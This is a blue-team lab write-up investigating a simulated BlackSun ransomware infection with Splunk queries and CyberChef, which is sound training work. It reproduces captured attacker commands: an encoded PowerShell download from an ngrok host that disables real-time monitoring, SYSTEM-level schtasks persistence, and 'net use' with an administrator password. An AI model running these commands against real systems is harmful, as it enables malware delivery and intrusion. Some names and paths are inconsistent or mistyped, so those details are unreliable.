# SOC L1 PS Eclipse
## SOC Ransomware Investigation with Splunk

### Introduction

During a routine shift as a SOC Analyst for an MSSP (Managed Security Service Provider) company called TryNotHackMe. One of the customers sent an email asking for an analyst to investigate the events that occurred on Jackson’s machine on Monday, May 16th, 2022. The client noted that the machine is operational, but some files have a weird file extension. The client is worried that there was a ransomware attempt on Keegan's device. Being on shift, you are tasked by your manager to check the events in Splunk to determine what occurred in Jackson’s device.

* In the first instance, I tried to investigate the incident by going to Search and Reporting
* I went to "Search and Reporting" and set the time to “All time.”

### Task 1

* I entered the following Query to search for the name of a suspicious binary was downloaded to the endpoint

<mark>➤ *.exe | dedup Image | table Image</mark>

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_1.png)
Figure 1

# New Search

```splunk
1 *.exe | dedup Image
2 | table Image
```

**110 events** (before 06/04/2026 14:21:07.000) No Event Sampling

* Events
* Patterns
* **Statistics (110)**
* Visualization


<table>
  <thead>
    <tr>
        <th>Image</th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td>C:\Program Files\Google\Chrome\Application\chrome.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\System32\svchost.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\Temp\OUTSTANDING_GUTTER.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\System32\taskhostw.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\System32\RuntimeBroker.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\SearchProtocolHost.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\System32\reg.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\reg.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\SecHealthUI.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\cmd.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\System32\cmd.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\System32\net.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\lsass.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\consent.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\System32\consent.exe</td>
    </tr>
  </tbody>
</table>

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_2.png)
Figure 2

I found a suspicious file with tempfolder

<mark>➤ OUTSTANDING_GUTTER.exe</mark>

**Task 2**

* I was interested in the address the binary was downloaded from.

* To search for HTTP requests and responses, the following query was typed in the search

<mark>➤ Tag=web</mark>

* No search result returned
* This might indicate that another type of processes was used by the adversary
* The following powershell query was then searched for:

<mark>➤ Powershell.exe | dedup CommandLine | table Commandline</mark>

The following query could also be used:

<mark>➤ OUTSTANDING_GUTTER.exe **AND Powersehll**</mark>

**Output**

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_3.png)
Figure 3

* Clicked on **powershell.exe** for the purpose of copying it.

**Output:**

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_4.png)
Figure 4

*       Copied the encoded text

*       Headed to CyberChef to decode the encoded Text

*       Pasted the full encoded text

*       Then typed in **“decode text”** in the search bar, dragged it into the **“recipe”** field and chose **“UTF-16LE(1200)”** or I could type in “Remove null bytes” as an alternative and to drag it into the “recipe” field.

*       This will show us the URL

➤ http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_5.png)
Figure 5

*   Opened another CyberChef page and pasted the output of the first decoded text in the URL to defang the URL.

*   Removed all the contents in the "Recipe" field first,

*   Then typed in "Defang URL" and dragged it into "Recipe" to reveal the actual URL.

*   This gave me the exact encoded text.

<mark>➤ hxxp[://]886e-181-215-214-32[.]ngrok[.]io</mark>

# Task 3

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_6.png)
Figure 6

* Clicked on parent image to find the full path of which Windows executable was used to download the suspicious binary?

Result: <span style="color: red">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span>

# Task 4

I intended to examine which command was executed to configure the suspicious binary to run with elevated privileges.

I typed in the search field the following query:

> <span style="color: red">Powershell.exe | dedup CommandLine | table CommandLine</span>

Applications Places System Mon 6 Apr, 16:40 AttackBox IP:10.112.117.48

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_7.png)
Figure 7

# New Search

```splunk
1 powershell.exe
2 | dedup CommandLine
3 | table CommandLine
```

**13 events** (before 06/04/2026 15:40:04.000) No Event Sampling

* Events
* Patterns
* **Statistics (13)**
* Visualization


<table>
  <thead>
    <tr>
        <th>CommandLine</th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @"C:\Windows\TEMP\whwpdgqg\whwpdgqg.cmdline"</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\reg.exe UNLOAD HKU\Temp</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\reg.exe LOAD HKU\Temp C:\Users\Public\NTUSER.DAT</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\reg.exe LOAD HKU\Temp C:\Users\keegan\NTUSER.DAT</td>
    </tr>
    <tr>
        <td>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\cmd.exe /u /c "dir /a-d /b /s C:\ &gt; C:\Windows\TEMP\BlackSun_TMPALL"</td>
    </tr>
    <tr>
        <td>C:\Windows\system32
et.exe use \\192.168.10.167\c$ /DELETE /y</td>
    </tr>
    <tr>
        <td>C:\Windows\system32
et.exe use \\192.168.10.167\c$ /USER:KREISVERKEHR\administrator altalt</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\whoami.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\schtasks.exe /Run /TN OUTSTANDING_GUTTER.exe</td>
    </tr>
    <tr>
        <td>C:\Windows\system32\schtasks.exe /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\OUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU S</td>
    </tr>
    <tr>
        <td>powershell.exe -exec bypass -enc UwB1AHQALQBNAHAAUAByAGUAZgB1AHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwB1AHQAIABoAHQAdABwADoALwAvADgAOAA2A...</td>
    </tr>
  </tbody>
</table>

* Clicked to view the event

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_8.png)
Figure 8

**Result:**

<mark>"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f.”</mark>

# Task 5

* I was interested in the permissions the suspicious binary was meant to run as and the command that was used to run the binary with elevated privileges. (Format: User + ; + CommandLine)

* I typed in the search field the first following query:

<mark>➤ `*OUTSTANDING_GUTTER.exe*`</mark> 

Result for the permissions the suspicious binary: <mark>NT AUTHORITY\SYSTEM</mark>

## Output:

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_9.png)
Figure 9

Second Query: <span style="color: red">*OUTSTANDING_GUTTER.exe*</span> AND <span style="color: red">schtask.exe</span>

Result for the command used to run the binary with elevated privileges:

<span style="color: red">"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe</span>

**Output:**

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_10.png)
Figure 10

This will give us the full path:

**Full Result:** <mark>NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe</mark>

Task 6

Given the fact that the suspicious binary connected to a remote server, I intended to investigate which address did the suspicious binary was connected to? Add http:// to your answer & defang the URL.

*   Type in the following query in the search

> \*OUTSTANDING\_GUTTER.exe\*

*   To look for Http query, one could search for query field in the selected fields
*   If we do not find it in the **“selected field”** we add it to the selected fields by clicking on **“More fields”**, so I did exactly that

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_11.png)
Figure 11

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_12.png)
Figure 12

Clicked “**Query Name**” to see the suspicious binary connected to the remote server

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_13.png)
Figure 13

Result: 9030-181-215-214-32.ngrok.io

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_14.png)
Figure 14

Headed back to CyberChef to defang the URL and add http to the output.

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_15.png)
Figure 15
Output:

**Result:** <mark>hxxp[://]9030-181-215-214-32[.]ngrok[.]io</mark>

# Task 7

* A PowerShell script was downloaded to the same location as the suspicious binary, so I attempted to check for the name of the file.

* To do so, I typed the following query in the search

<mark>➤ .ps1</mark>

Output:

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_16.png)
Figure 16

Result: 

<mark>➤ script.ps1</mark>

# Task 8

A malicious script was flagged as malicious, so I tried to examine the actual name of the malicious script

* I copied the **File Hash** we had from the previous query

Output:

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_17.png)
Figure 17

*   Headed to Virus total web

*   Paste in the File Hash we had from the previous query (**SHA256-E5429F2E44990B3D4E249C566FBF19741E671C0E40B809F87248D9EC9114BEF9**)

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_18.png)
Figure 18

Name of the malicious script: <mark>**BlackSun-ps1**</mark>

# Task 9

A ransomware note was saved to disk, which can serve as an IOC.

* I then searched for the full path to which the ransom note was saved
* Files are usually text file, so I searched for:

<mark>➤ .txt</mark>

## Output:

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_19.png)
Figure 19

**Result:** C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt

## Task 10

The script saved an image file to disk to replace the user's desktop wallpaper, which could also serve as an important IOC to investigate on.

* To search for the full path of the image, I type `.jpg` in the search to see the script that saved an image file to disk to replace the user's desktop wallpaper

* The search result returned the jpg file

![image alt](https://github.com/Michaelsalaja/SOC-BlackSun-Ransomeware-Incident-Investigation-Lab/blob/7a0330330b7ac6c08b3655d1d91adf6117835a3a/Figure_20.png)
Figure 20

## Conclusion

This investigation equipped me with the practical skills and required knowledge to investigate a ransomware incident on a user’s device with Splunk using different search queries. It is called “learning by doing.” It also taught me that there are so many ways to search for the intended results using different queries. The power of Splunk as SIEM tool is indescribable as it has its capabilities of uncovering malicious actors at any given time, but it must be pointed out that Splunk is only as good as the analyst who uses it for investigate alerts and incidents.


#SOC #Splunk #RansomewareAnalysis #BlueTeam
